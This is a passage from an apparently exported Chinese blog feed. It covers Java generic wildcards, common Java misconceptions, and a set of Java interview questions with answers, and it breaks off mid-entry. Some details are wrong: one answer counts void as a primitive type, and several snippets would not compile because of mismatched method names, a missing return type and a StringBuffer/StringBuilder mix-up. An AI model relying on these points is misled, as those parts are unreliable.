<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class GenericTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String\[\] args) &#123;</span><br><span class="line"></span><br><span class="line">        Box&lt;Integer&gt; a &#x3D; new Box&lt;Integer&gt;(712);</span><br><span class="line">        Box&lt;Number&gt; b &#x3D; a;  &#x2F;&#x2F; 1</span><br><span class="line">        Box&lt;Float&gt; f &#x3D; new Box&lt;Float&gt;(3.14f);</span><br><span class="line">        b.setData(f);        &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void getData(Box&lt;Number&gt; data) &#123;</span><br><span class="line">        System.out.println(&quot;data :&quot; + data.getData());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Box&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">    private T data;</span><br><span class="line"></span><br><span class="line">    public Box() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Box(T data) &#123;</span><br><span class="line">        setData(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public T getData() &#123;</span><br><span class="line">        return data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setData(T data) &#123;</span><br><span class="line">        this.data &#x3D; data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>这个例子中，显然//1和//2处肯定会出现错误提示的。在此我们可以使用反证法来进行说明。 假设Box<Number>在逻辑上可以视为Box<Integer>的父类，那么//1和//2处将不会有错误提示了，那么问题就出来了，通过getData()方法取出数据时到底是什么类型呢？Integer? Float? 还是Number？且由于在编程过程中的顺序不可控性，导致在必要的时候必须要进行类型判断，且进行强制类型转换。显然，这与泛型的理念矛盾，因此，<strong>在逻辑上Box<Number>不能视为Box<Integer>的父类。</strong> 好，那我们回过头来继续看“类型通配符”中的第一个例子，我们知道其具体的错误提示的深层次原因了。那么如何解决呢？总部能再定义一个新的函数吧。这和Java中的多态理念显然是违背的，因此，我们需要一个在逻辑上可以用来表示同时是Box<Integer>和Box<Number>的父类的一个引用类型，由此，类型通配符应运而生。</p>
<p> <strong>类型通配符一般是使用 ? 代替具体的类型实参。注意了，此处是类型实参，而不是类型形参！且Box&lt;?&gt;在逻辑上是Box<Integer>、Box<Number>…等所有Box&lt;具体类型实参&gt;的父类。由此，我们依然可以定义泛型方法，来完成此类需求。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class GenericTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String\[\] args) &#123;</span><br><span class="line"></span><br><span class="line">        Box&lt;String&gt; name &#x3D; new Box&lt;String&gt;(&quot;corn&quot;);</span><br><span class="line">        Box&lt;Integer&gt; age &#x3D; new Box&lt;Integer&gt;(712);</span><br><span class="line">        Box&lt;Number&gt; number &#x3D; new Box&lt;Number&gt;(314);</span><br><span class="line"></span><br><span class="line">        getData(name);</span><br><span class="line">        getData(age);</span><br><span class="line">        getData(number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void getData(Box&lt;?&gt; data) &#123;</span><br><span class="line">        System.out.println(&quot;data :&quot; + data.getData());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>有时候，我们还可能听到<strong>类型通配符上限和类型通配符下限</strong>。具体有是怎么样的呢？ 在上面的例子中，如果需要定义一个功能类似于getData()的方法，但对类型实参又有进一步的限制：只能是Number类及其子类。此时，需要用到类型通配符上限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class GenericTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String\[\] args) &#123;</span><br><span class="line"></span><br><span class="line">        Box&lt;String&gt; name &#x3D; new Box&lt;String&gt;(&quot;corn&quot;);</span><br><span class="line">        Box&lt;Integer&gt; age &#x3D; new Box&lt;Integer&gt;(712);</span><br><span class="line">        Box&lt;Number&gt; number &#x3D; new Box&lt;Number&gt;(314);</span><br><span class="line"></span><br><span class="line">        getData(name);</span><br><span class="line">        getData(age);</span><br><span class="line">        getData(number);</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F;getUpperNumberData(name); &#x2F;&#x2F; 1</span><br><span class="line">        getUpperNumberData(age);    &#x2F;&#x2F; 2</span><br><span class="line">        getUpperNumberData(number); &#x2F;&#x2F; 3</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void getData(Box&lt;?&gt; data) &#123;</span><br><span class="line">        System.out.println(&quot;data :&quot; + data.getData());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void getUpperNumberData(Box&lt;? extends Number&gt; data)&#123;</span><br><span class="line">        System.out.println(&quot;data :&quot; + data.getData());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> </p>
<p>此时，显然，在代码//1处调用将出现错误提示，而//2 //3处调用正常。 <strong>类型通配符上限通过形如Box&lt;? extends Number&gt;形式定义，相对应的，类型通配符下限为Box&lt;? super Number&gt;形式，其含义与类型通配符上限正好相反</strong>，在此不作过多阐述了。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中常见的误解</title>
    <url>/2017/05/30/java%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AF%AF%E8%A7%A3/</url>
    <content><![CDATA[<h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h5><p>Java是门极简风格的语言，比其它语言相比，它故意保持较少的特性，不仅在有些不常见的情况下会出些奇奇怪怪的错误，即使很一般的情况下也有可能让人栽根头。 如果你习惯了别的语言，你读Java 的代码很容易搞错一些概念。</p>
<h5 id="变量要么是引用-，要么是基础类型"><a href="#变量要么是引用-，要么是基础类型" class="headerlink" title="变量要么是引用 ，要么是基础类型"></a><strong>变量要么是引用 ，要么是基础类型</strong></h5><p>这是对的，变量不是对象。也就是说在下面这个例子里，s不是个对象，也不是字符串，它只是一个字符串的引用。</p>
<p>String s = “Hello”;</p>
<p> </p>
<p>这个能解释很多的问题，比如： 问题:如果说字符 串是不可变的，为什么我能修改它？ s+=“！” 回答：在Java里是不可变的，你改变的只是引用而已。</p>
<h5 id="比较的是引用，不是内容"><a href="#比较的是引用，不是内容" class="headerlink" title="==比较的是引用，不是内容"></a><strong>==比较的是引用，不是内容</strong></h5><p>让人更混乱的是，有时候用==是能比较内容的。如果你有两个一样的不可变值，JVM会尝试引用 同一个对象 。</p>
<p>String s1 = “Hi”, s2 = “Hi”;<br>Integer a = 12, b = 12;</p>
<p> </p>
<p>这两个例子中用到了对象池，所以最后引用 的是同样的对象。s1==s2和a==b都是返回true,JVM已经把两个引用 都指向了同一个对象。然而，如果稍微改下代码，JVM没有把对象放到池里的话，==就会返回false，可能会让你意想不到。这个时候你得用equals了。</p>
<p>String s3 = new String(s1);<br>   Integer c = -222, d = -222;<br>s1 == s2      // is true<br>  s1 == s3      // is false<br>  s1.equals(s3) // is true<br>  a == b        // is true<br>  c == d        // is false (different objects were created)<br>  c.equals(d)   // is true</p>
<p> </p>
<p>对于整型来说，对象池缓存的范围是-128到127（还有可能更高）。</p>
<h5 id="Java通过传值进行引用传递"><a href="#Java通过传值进行引用传递" class="headerlink" title="Java通过传值进行引用传递"></a><strong>Java通过传值进行引用传递</strong></h5><p>所有的变量都是传值，包括引用。这就是说如果你有个变量，它是一个对象的引用，这个引用会被拷贝后再传参，而不是传递的对应的那个对象。</p>
<p>public static void addAWord(StringBuilder sb) {<br>     sb.append(“ word”);<br>     sb = null;<br>}  </p>
<p>StringBuilder sb = new StringBuilder(“first “);<br>addWord(sb);<br>addWord(sb);<br>System.out.println(sb); // prints “first word word”</p>
<p> </p>
<p>引用的对象可以改变，不过如果修改拷贝的这个引用，对调用方是没有影响的。</p>
<h5 id="在大多数JVM实现里，Object-hashCode和内存地址无关"><a href="#在大多数JVM实现里，Object-hashCode和内存地址无关" class="headerlink" title="在大多数JVM实现里，Object.hashCode和内存地址无关"></a><strong>在大多数JVM实现里，Object.hashCode和内存地址无关</strong></h5><p>hashCode必须是保持不变的。不然的话HashSet或者ConcurrentHashMap就没法玩了。然而对象可以在内存的任何地方，并且它的位置还可能不断变化，而这个对你的程序来说是透明的。使用内存地址来当做hashCode是不可行的（除非你自己有一个JVM，对象是固定不动的）。 对于 OpenJDK和Hotspot JVM来说，hashCode是按需生成的，并存储在对象的头部。使用Unsafe API你看到hashCode是否已经生成了，甚至还可以修改它。</p>
<h5 id="Object-toString那些不为人知的事情"><a href="#Object-toString那些不为人知的事情" class="headerlink" title="Object.toString那些不为人知的事情"></a><strong>Object.toString那些不为人知的事情</strong></h5><p>toString的默认行为是打印类的的内部名称还有对象的hashCode。 上面已经提到，hashCode并不是内存地址，尽管它是用16进制打印的。同样的，类名，尤其是数组的类名，更容易让人头晕。比如说String[]的名称是[Ljava.lang.String; 这个[表明它是个数组，L说明它是Java语言（Language）创建的类，并不是基础类型比如byte这些，顺便提一下byte内部名称是B。;号标识类的结束。比如你有个这样的数组：</p>
<p>String[] words = { “Hello”, “World” };<br>System.out.println(words);</p>
<p> </p>
<p>输出会是这样：</p>
<p>[Ljava.lang.String;@45ee12a7</p>
<p> </p>
<p>很不幸你只知道这是个对象数组。如果你只有一个Object实例words，这样是不够的，你得调用下Arrays.toString(words)。这极其恶劣地破坏了封装的原则，在StackOverflow上面这也是最常见的一类问题。</p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>java常见面试题及答案</title>
    <url>/2017/05/30/java%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E7%AD%94%E6%A1%88/</url>
    <content><![CDATA[<h2 id="java常见面试题及答案"><a href="#java常见面试题及答案" class="headerlink" title="java常见面试题及答案"></a>java常见面试题及答案</h2><h3 id="1-什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？"><a href="#1-什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？" class="headerlink" title="1.什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？"></a>1.什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？</h3><blockquote>
<p>Java 虚拟机是一个可以执行 Java 字节码的虚拟机进程。Java 源文件被编译成能被 Java 虚拟机执行的字节码文件。 Java 被设计成允许应用程序可以运行在任意的平台，而不需要程序员为每一个平台单独重写或者是重新编译。 Java 虚拟机让这个变为可能，因为它知道底层硬件平台的指令长度和其他特性。</p>
</blockquote>
<h3 id="2-JDK和JRE的区别是什么？"><a href="#2-JDK和JRE的区别是什么？" class="headerlink" title="2.JDK和JRE的区别是什么？"></a>2.JDK和JRE的区别是什么？</h3><blockquote>
<p><em>JDK:</em> java开发工具包,包含了JRE、编译器和其它工具（如：javaDOc、java调试器) <em>JRE:</em> java运行环境,包含java虚拟机和java程序所需的核心类库。 如果只是想跑java程序，那么只需安装JRE，如果要写java程序并且运行，那就需要JDK了。</p>
</blockquote>
<h3 id="3-”static”关键字是什么意思？Java中是否可以覆盖一个private或者是static的方法？"><a href="#3-”static”关键字是什么意思？Java中是否可以覆盖一个private或者是static的方法？" class="headerlink" title="3.”static”关键字是什么意思？Java中是否可以覆盖一个private或者是static的方法？"></a>3.”static”关键字是什么意思？Java中是否可以覆盖一个private或者是static的方法？</h3><blockquote>
<p>如果一个类的变量或者方法前面有<strong>static</strong>修饰，那么表明这个方法或者变量属于这个类，也就是说可以在不创建对象的情况下直接使用 当父类的方法被<strong>private</strong>修饰时，表明该方法为父类私有，对其他任何类都是不可见的，因此如果子类定了一个与父类一样的方法，这对于子类来说相当于是一个新的私有方法，且如果要进行向上转型，然后去调用该“覆盖方法”，会产生编译错误</p>
</blockquote>
<p>class Parent {<br>    private fun() {<br>        …<br>    }<br>}<br>class Child extends Parent {<br>    private fun() {<br>        …<br>    }<br>}<br>class Test {<br>    public static void main(String[] args) {<br>        Parent c = new Child();<br>        c.fun(); //编译出错<br>    }<br>}</p>
<p> </p>
<blockquote>
<p><strong>static</strong>方法时编译时静态绑定的，属于类，而覆盖是运行时动态绑定的(动态绑定的多态),因此不能覆盖.</p>
</blockquote>
<h3 id="4-Java支持的基本数据类型有哪些？什么是自动拆装箱？"><a href="#4-Java支持的基本数据类型有哪些？什么是自动拆装箱？" class="headerlink" title="4.Java支持的基本数据类型有哪些？什么是自动拆装箱？"></a>4.Java支持的基本数据类型有哪些？什么是自动拆装箱？</h3><blockquote>
<p>java支持的基本数据类型有以下9种:byte,shot,int,long,float,double,char,boolean,void. 自动拆装箱是java从jdk1.5引用，目的是将原始类型自动的装换为相对应的对象，也可以逆向进行，即拆箱。这也体现java中一切皆对象的宗旨。 所谓自动装箱就是将原始类型自动的转换为对应的对象，而拆箱就是将对象类型转换为基本类型。java中的自动拆装箱通常发生在变量赋值的过程中，如：</p>
</blockquote>
<pre><code>Integer object = 3; //自动装箱
int o = object; //拆箱</code></pre>
<p> </p>
<blockquote>
<p>在java中，应该注意自动拆装箱，因为有时可能因为java自动装箱机制，而导致创建了许多对象，对于内存小的平台会造成压力。</p>
</blockquote>
<h3 id="5-覆盖和重载是什么"><a href="#5-覆盖和重载是什么" class="headerlink" title="5. 覆盖和重载是什么?"></a>5. 覆盖和重载是什么?</h3><blockquote>
<p><strong>覆盖</strong>也叫<strong>重写</strong>，发生在子类与父类之间，表示子类中的方法可以与父类中的某个方法的名称和参数完全相同，通过子类创建的实例对象调用这个方法时，将调用子类中的定义方法，这相当于把父类中定义的那个完全相同的方法给覆盖了，这也是面向对象编程的多态性的一种表现。 <strong>重载</strong>是指在一个类中，可以有多个相同名称的方法，但是他们的参数列表的个数或类型不同，当调用该方法时，根据传递的参数类型调用对应参数列表的方法。当参数列表相同但返回值不同时，将会出现编译错误，这并不是重载，因为jvm无法根据返回值类型来判断应该调用哪个方法。</p>
</blockquote>
<h3 id="6-Java支持多继承么？如果不支持，如何实现"><a href="#6-Java支持多继承么？如果不支持，如何实现" class="headerlink" title="6.Java支持多继承么？如果不支持，如何实现?"></a>6.Java支持多继承么？如果不支持，如何实现?</h3><blockquote>
<p>在java中是单继承的，也就是说一个类只能继承一个父类。 java中实现多继承有两种方式,一是接口，而是内部类.</p>
</blockquote>
<p>//实现多个接口 如果两个接口的变量相同 那么在调用该变量的时候 编译出错<br>interface interface1 {<br>    static String field = “dd”;<br>    public void fun1();<br>    }<br>interface interface2 {<br>static String field = “dddd”;<br>    public void fun2();<br>    }<br>class child implements interface1,interface2 {<br>    static String field = “dddd”;<br>    @Override<br>    public void fun2() {<br>    }</p>
<pre><code>@Override
public void fun1() &#123;
&#125;    </code></pre>
<p>}</p>
<p>//内部类 间接多继承<br>class Child {<br>class Father {<br>    private void strong() {<br>        System.out.println(“父类”);<br>    }<br>}<br>class Mother {<br>    public void getCute() {<br>        System.out.println(“母亲”);<br>    }<br>}<br>public void getStrong() {<br>    Father f = new Father();<br>    f.strong();<br>    }<br>public void getCute() {<br>    Mother m = new Mother();<br>    m.getCute();<br>    }<br>}</p>
<p> </p>
<h3 id="7-什么是值传递和引用传递？java中是值传递还是引用传递，还是都有"><a href="#7-什么是值传递和引用传递？java中是值传递还是引用传递，还是都有" class="headerlink" title="7.什么是值传递和引用传递？java中是值传递还是引用传递，还是都有?"></a>7.什么是值传递和引用传递？java中是值传递还是引用传递，还是都有?</h3><blockquote>
<p><strong>值传递</strong> 就是在方法调用的时候，实参是将自己的一份拷贝赋给形参，在方法内，对该参数值的修改不影响原来实参，常见的例子就是刚开始学习c语言的时候那个交换方法的例子了。 <strong>引用传递</strong> 是在方法调用的时候，实参将自己的地址传递给形参，此时方法内对该参数值的改变，就是对该实参的实际操作。 在java中只有一种传递方式，那就是<strong>值传递</strong>.可能比较让人迷惑的就是java中的对象传递时，对形参的改变依然会影响到该对象的内容。 下面这个例子来说明java中是值传递.</p>
</blockquote>
<p>public class Test {<br>    public static void main(String[] args) {<br>        StringBuffer sb = new StringBuffer(“hello “);<br>        getString(sb);<br>        System.out.println(sb);<br>    }<br>    public static void getString(StringBuffer s) {<br>        //s = new StringBuffer(“ha”);<br>        s.append(“world”);<br>    }<br>}</p>
<p> </p>
<blockquote>
<p>在上面这个例子中,当前输出结果为:hello world。这并没有什么问题，可能就是大家平常所理解的引用传递，那么当然会改变StringBuffer的内容。但是如果把上面的注释去掉，那么就会输出:hello.此时sb的值并没有变成ha hello. 假如说是引用传递的话，那么形参的s也就是sb的地址，此时在方法里new StringBuffer（），并将该对象赋给s，也就是说s现在指向了这个新创建的对象.按照引用传递的说法，此时对s的改变就是对sb的操作，也就是说sb应该也指向新创建的对象，那么输出的结果应该为ha world.但实际上输出的仅是hello.这说明sb指向的还是原来的对象，而形参s指向的才是创建的对象,这也就验证了java中的对象传递也是值传递。</p>
</blockquote>
<h3 id="8-接口和抽象类的区别是什么"><a href="#8-接口和抽象类的区别是什么" class="headerlink" title="8.接口和抽象类的区别是什么?"></a>8.接口和抽象类的区别是什么?</h3><blockquote>
<p>不同点在于：</p>
<ol>
<li>接口中所有的方法隐含的都是抽象的。而抽象类则可以同时包含抽象和非抽象的方法。</li>
<li>类可以实现很多个接口，但是只能继承一个抽象类</li>
<li>类如果要实现一个接口，它必须要实现接口声明的所有方法。但是，类可以不实现抽象类声明的所有方法，当然，在这种情况下，类也必须得声明成是抽象的。</li>
<li>抽象类可以在不提供接口方法实现的情况下实现接口。</li>
<li>Java 接口中声明的变量默认都是 final 的。抽象类可以包含非 final 的变量。</li>
<li>Java 接口中的成员函数默认是 public 的。抽象类的成员函数可以是 private，protected 或者是 public 。</li>
<li>接口是绝对抽象的，不可以被实例化(java 8已支持在接口中实现默认的方法)。抽象类也不可以被实例化，但是，如果它包含 main 方法的话是可以被调用的。</li>
</ol>
</blockquote>
<h3 id="9-构造器（constructor）是否可被重写（override）"><a href="#9-构造器（constructor）是否可被重写（override）" class="headerlink" title="9.构造器（constructor）是否可被重写（override）?"></a>9.构造器（constructor）是否可被重写（override）?</h3><blockquote>
<p>构造方法是不能被子类重写的，但是构造方法可以重载，也就是说一个类可以有多个构造方法。</p>
</blockquote>
<h3 id="10-Math-round-11-5-等于多少-Math-round-11-5-等于多少"><a href="#10-Math-round-11-5-等于多少-Math-round-11-5-等于多少" class="headerlink" title="10.Math.round(11.5) 等于多少? Math.round(-11.5)等于多少?"></a>10.Math.round(11.5) 等于多少? Math.round(-11.5)等于多少?</h3><blockquote>
<p>Math.round(11.5)==12 Math.round(-11.5)==-11 round 方法返回与参数 最接近的长整数，参数加 1/2 后求其 floor.</p>
</blockquote>
<h3 id="11-String-StringBuffer-StringBuilder的区别。"><a href="#11-String-StringBuffer-StringBuilder的区别。" class="headerlink" title="11. String, StringBuffer StringBuilder的区别。"></a>11. String, StringBuffer StringBuilder的区别。</h3><blockquote>
<p>tring 的长度是不可变的； StringBuffer的长度是可变的，如果你对字符串中的内容经常进行操作，特别是内容要修改时，那么使用 StringBuffer，如果最后需要 &gt;String，那么使用 StringBuffer 的 toString() 方法；线程安全； StringBuilder 是从 JDK 5 开始，为StringBuffer该类补充了一个单个线程使用的等价类；通常应该优先使用 StringBuilder 类，因&gt;为它支持所有相同的操作，但由于它不执行同步，所以速度更快。 使用字符串的时候要特别小心，如果对一个字符串要经常改变的话，就一定不要用String,否则会创建许多无用的对象出来. 来看一下比较</p>
</blockquote>
<p>String s = “hello”+”world”+”i love you”;<br>StringBuffer Sb = new StringBuilder(“hello”).append(“world”).append(“i love you”);</p>
<p> </p>
<blockquote>
<p>这个时候s有多个字符串进行拼接，按理来说会有多个对象产生，但是jvm会对此进行一个优化，也就是说只创建了一个对象，此时它的执行速度要比StringBuffer拼接快.再看下面这个:</p>
</blockquote>
<p>String s2 = “hello”;<br>String s3 = “world”;<br>String s4 = “i love you”;<br>String s1 = s2 + s3 + s4;</p>
<p> </p>
<blockquote>
<p>上面这种情况，就会多创建出来三个对象，造成了内存空间的浪费.</p>
</blockquote>
<h3 id="12-JVM内存分哪几个区，每个区的作用是什么"><a href="#12-JVM内存分哪几个区，每个区的作用是什么" class="headerlink" title="12.JVM内存分哪几个区，每个区的作用是什么?"></a>12.JVM内存分哪几个区，每个区的作用是什么?</h3><blockquote>
<p>java虚拟机主要分为以下一个区: <strong>方法区：</strong></p>
<ol>
<li>有时候也成为<strong>永久代</strong>，在该区内很少发生垃圾回收，但是并不代表不发生GC，在这里进行的GC主要是对方法区里的常量池和对类型的卸载</li>
<li>方法区主要用来存储已被虚拟机加载的类的信息、常量、静态变量和即时编译器编译后的代码等数据。</li>
<li>该区域是被线程共享的。</li>
<li>方法区里有一个运行时常量池，用于存放静态编译产生的字面量和符号引用。该常量池具有动态性，也就是说常量并不一定是编译时确定，运行时生成的常量也会存在这个常量池中。</li>
</ol>
<p><strong>虚拟机栈:</strong></p>
<ol>
<li>虚拟机栈也就是我们平常所称的<strong>栈内存</strong>,它为java方法服务，每个方法在执行的时候都会创建一个栈帧，用于存储局部变量表、操作数栈、动态链接和方法出口等信息。</li>
<li>虚拟机栈是线程私有的，它的生命周期与线程相同。</li>
<li>局部变量表里存储的是基本数据类型、returnAddress类型（指向一条字节码指令的地址）和对象引用，这个对象引用有可能是指向对象起始地址的一个指针，也有可能是代表对象的句柄或者与对象相关联的位置。局部变量所需的内存空间在编译器间确定 4.操作数栈的作用主要用来存储运算结果以及运算的操作数，它不同于局部变量表通过索引来访问，而是压栈和出栈的方式 5.每个栈帧都包含一个指向运行时常量池中该栈帧所属方法的引用，持有这个引用是为了支持方法调用过程中的动态连接.动态链接就是将常量池中的符号引用在运行期转化为直接引用。</li>
</ol>
<p><strong>本地方法栈</strong> 本地方法栈和虚拟机栈类似，只不过本地方法栈为Native方法服务。 <strong>堆</strong> java堆是所有线程所共享的一块内存，在虚拟机启动时创建，几乎所有的对象实例都在这里创建，因此该区域经常发生垃圾回收操作。 <strong>程序计数器</strong> 内存空间小，字节码解释器工作时通过改变这个计数值可以选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理和线程恢复等功能都需要依赖这个计数器完成。该内存区域是唯一一个java虚拟机规范没有规定任何OOM情况的区域。</p>
</blockquote>
<h3 id="13-如和判断一个对象是否存活-或者GC对象的判定方法"><a href="#13-如和判断一个对象是否存活-或者GC对象的判定方法" class="headerlink" title="13.如和判断一个对象是否存活?(或者GC对象的判定方法)"></a>13.如和判断一个对象是否存活?(或者GC对象的判定方法)</h3><blockquote>
<p>判断一个对象是否存活有两种方法:</p>
<ol>
<li><strong>引用计数法</strong> 所谓引用计数法就是给每一个对象设置一个引用计数器，每当有一个地方引用这个对象时，就将计数器加一，引用失效时，计数器就减一。当一个对象的引用计数器为零时，说明此对象没有被引用，也就是“死对象”,将会被垃圾回收. 引用计数法有一个缺陷就是无法解决循环引用问题，也就是说当对象A引用对象B，对象B又引用者对象A，那么此时A,B对象的引用计数器都不为零，也就造成无法完成垃圾回收，所以主流的虚拟机都没有采用这种算法。</li>
</ol>
<p>2.<strong>可达性算法</strong>(引用链法) 该算法的思想是：从一个被称为<strong>GC Roots</strong>的对象开始向下搜索，如果一个对象到GC Roots没有任何引用链相连时，则说明此对象不可用。 在java中可以作为GC Roots的对象有以下几种:</p>
<ul>
<li>虚拟机栈中引用的对象</li>
<li>方法区类静态属性引用的对象</li>
<li>方法区常量池引用的对象</li>
<li>本地方法栈JNI引用的对象</li>
</ul>
<p>虽然这些算法可以判定一个对象是否能被回收，但是当满足上述条件时，一个对象比<strong>不一定会被回收</strong>。当一个对象不可达GC Root时，这个对象并 <strong>不会立马被回收</strong>，而是出于一个死缓的阶段，若要被真正的回收需要经历两次标记 如果对象在可达性分析中没有与GC Root的引用链，那么此时就会被第一次标记并且进行一次筛选，筛选的条件是是否有必要执行finalize()方法。当对象没有覆盖finalize()方法或者已被虚拟机调用过，那么就认为是没必要的。 如果该对象有必要执行finalize()方法，那么这个对象将会放在一个称为F-Queue的对队列中，虚拟机会触发一个Finalize()线程去执行，此线程是低优先级的，并且虚拟机不会承诺一直等待它运行完，这是因为如果finalize()执行缓慢或者发生了死锁，那么就会造成F-Queue队列一直等待，造成了内存回收系统的崩溃。GC对处于F-Queue中的对象进行第二次被标记，这时，该对象将被移除”即将回收”集合，等待回收。</p>
</blockquote>
<h3 id="14-简述java垃圾回收机制"><a href="#14-简述java垃圾回收机制" class="headerlink" title="14.简述java垃圾回收机制?"></a>14.简述java垃圾回收机制?</h3><blockquote>
<p>在java中，程序员是不需要显示的去释放一个对象的内存的，而是由虚拟机自行执行。在JVM中，有一个垃圾回收线程，它是低优先级的，在正常情况下是不会执行的，只有在虚拟机空闲或者当前堆内存不足时，才会触发执行，扫面那些没有被任何引用的对象，并将它们添加到要回收的集合中，进行回收。</p>
</blockquote>
<h3 id="15-java中垃圾收集的方法有哪些"><a href="#15-java中垃圾收集的方法有哪些" class="headerlink" title="15.java中垃圾收集的方法有哪些?"></a>15.java中垃圾收集的方法有哪些?</h3><blockquote>
<ol>
<li><strong>标记-清除:</strong> 这是垃圾收集算法中最基础的，根据名字就可以知道，它的思想就是标记哪些要被回收的对象，然后统一回收。这种方法很简单，但是会有两个主要问题：1.效率不高，标记和清除的效率都很低；2.会产生大量不连续的内存碎片，导致以后程序在分配较大的对象时，由于没有充足的连续内存而提前触发一次GC动作。</li>
<li><strong>复制算法:</strong> 为了解决效率问题，复制算法将可用内存按容量划分为相等的两部分，然后每次只使用其中的一块，当一块内存用完时，就将还存活的对象复制到第二块内存上，然后一次性清楚完第一块内存，再将第二块上的对象复制到第一块。但是这种方式，内存的代价太高，每次基本上都要浪费一般的内存。 于是将该算法进行了改进，内存区域不再是按照1：1去划分，而是将内存划分为8:1:1三部分，较大那份内存交Eden区，其余是两块较小的内存区叫Survior区。每次都会优先使用Eden区，若Eden区满，就将对象复制到第二块内存区上，然后清除Eden区，如果此时存活的对象太多，以至于Survivor不够时，会将这些对象通过分配担保机制复制到老年代中。(java堆又分为新生代和老年代)</li>
<li><strong>标记-整理</strong> 该算法主要是为了解决标记-清除，产生大量内存碎片的问题；当对象存活率较高时，也解决了复制算法的效率问题。它的不同之处就是在清除对象的时候现将可回收对象移动到一端，然后清除掉端边界以外的对象，这样就不会产生内存碎片了。 <strong>分代收集</strong> 现在的虚拟机垃圾收集大多采用这种方式，它根据对象的生存周期，将堆分为新生代和老年代。在新生代中，由于对象生存期短，每次回收都会有大量对象死去，那么这时就采用<strong>复制</strong>算法。老年代里的对象存活率较高，没有额外的空间进行分配担保，所以可以使用<strong>标记-整理</strong> 或者 <strong>标记-清除</strong>。</li>
</ol>
</blockquote>
<h3 id="16-java内存模型"><a href="#16-java内存模型" class="headerlink" title="16.java内存模型"></a>16.java内存模型</h3><blockquote>
<p>java内存模型(JMM)是线程间通信的控制机制.JMM定义了主内存和线程之间抽象关系。线程之间的共享变量存储在主内存（main memory）中，每个线程都有一个私有的本地内存（local memory），本地内存中存储了该线程以读/写共享变量的副本。本地内存是JMM的一个抽象概念，并不真实存在。它涵盖了缓存，写缓冲区，寄存器以及其他的硬件和编译器优化。Java内存模型的抽象示意图如下：</p>
<p><img src="http://upload-images.jianshu.io/upload_images/277730-377221ab99d50e0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>从上图来看，线程A与线程B之间如要通信的话，必须要经历下面2个步骤：</p>
<ol>
<li>首先，线程A把本地内存A中更新过的共享变量刷新到主内存中去。</li>
<li>然后，线程B到主内存中去读取线程A之前已更新过的共享变量。 写的很好:<a href="http://www.infoq.com/cn/articles/java-memory-model-1">http://www.infoq.com/cn/articles/java-memory-model-1</a></li>
</ol>
</blockquote>
<h3 id="17-java类加载过程"><a href="#17-java类加载过程" class="headerlink" title="17.java类加载过程?"></a>17.java类加载过程?</h3><blockquote>
<p>java类加载需要经历一下7个过程： <strong>加载</strong> 加载时类加载的第一个过程，在这个阶段，将完成一下三件事情：</p>
<ol>
<li>通过一个类的全限定名获取该类的二进制流。</li>
<li>将该二进制流中的静态存储结构转化为方法去运行时数据结构。</li>
<li>在内存中生成该类的Class对象，作为该类的数据访问入口。</li>
</ol>
<p><strong>验证</strong> 验证的目的是为了确保Class文件的字节流中的信息不回危害到虚拟机.在该阶段主要完成以下四钟验证:</p>
<ol>
<li>文件格式验证：验证字节流是否符合Class文件的规范，如主次版本号是否在当前虚拟机范围内，常量池中的常量是否有不被支持的类型.</li>
<li>元数据验证:对字节码描述的信息进行语义分析，如这个类是否有父类，是否集成了不被继承的类等。</li>
<li>字节码验证：是整个验证过程中最复杂的一个阶段，通过验证数据流和控制流的分析，确定程序语义是否正确，主要针对方法体的验证。如：方法中的类型转换是否正确，跳转指令是否正确等。</li>
<li>符号引用验证：这个动作在后面的解析过程中发生，主要是为了确保解析动作能正确执行。</li>
</ol>
<p><strong>准备</strong> 准备阶段是为类的静态变量分配内存并将其初始化为默认值，这些内存都将在方法区中进行分配。准备阶段不分配类中的实例变量的内存，实例变量将会在对象实例化时随着对象一起分配在Java堆中。</p>
</blockquote>
<p>public static int value=123;//在准备阶段value初始值为0 。在初始化阶段才会变为123 。</p>
<p> </p>
<blockquote>
